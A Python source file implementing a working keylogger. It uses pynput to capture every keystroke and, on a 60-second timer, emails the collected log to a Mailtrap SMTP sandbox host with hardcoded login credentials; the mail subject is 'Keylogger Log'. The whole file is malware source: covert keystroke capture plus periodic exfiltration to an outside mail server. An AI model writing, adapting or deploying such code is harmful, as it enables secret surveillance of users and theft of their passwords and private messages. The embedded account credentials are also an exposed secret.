import smtplib
import threading
from pynput import keyboard
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart

SEND_INTERVAL = 60  # seconds

MAILTRAP_HOST = "sandbox.smtp.mailtrap.io"
MAILTRAP_PORT = 2525
MAILTRAP_USERNAME = "79ed2c0bb6e631"
MAILTRAP_PASSWORD = "c1f63dbeb37d4b"

FROM_EMAIL = "test@example.com"
TO_EMAIL = "test@example.com"

class KeyLogger:
    def __init__(self, interval):
        self.interval = interval
        self.log = ""

    def append_log(self, key):
        try:
            self.log += key.char
        except AttributeError:
            self.log += f" [{key}] "

    def on_press(self, key):
        self.append_log(key)

    def send_log(self):
        if self.log:
            msg = MIMEMultipart()
            msg["From"] = FROM_EMAIL
            msg["To"] = TO_EMAIL
            msg["Subject"] = "Keylogger Log"
            msg.attach(MIMEText(self.log, "plain", "utf-8"))

            with smtplib.SMTP(MAILTRAP_HOST, MAILTRAP_PORT) as server:
                server.login(MAILTRAP_USERNAME, MAILTRAP_PASSWORD)
                server.send_message(msg)

            self.log = ""

        timer = threading.Timer(self.interval, self.send_log)
        timer.start()

    def start(self):
        listener = keyboard.Listener(on_press=self.on_press)
        self.send_log()
        listener.start()
        listener.join()

if __name__ == "__main__":
    keylogger = KeyLogger(SEND_INTERVAL)
    keylogger.start()

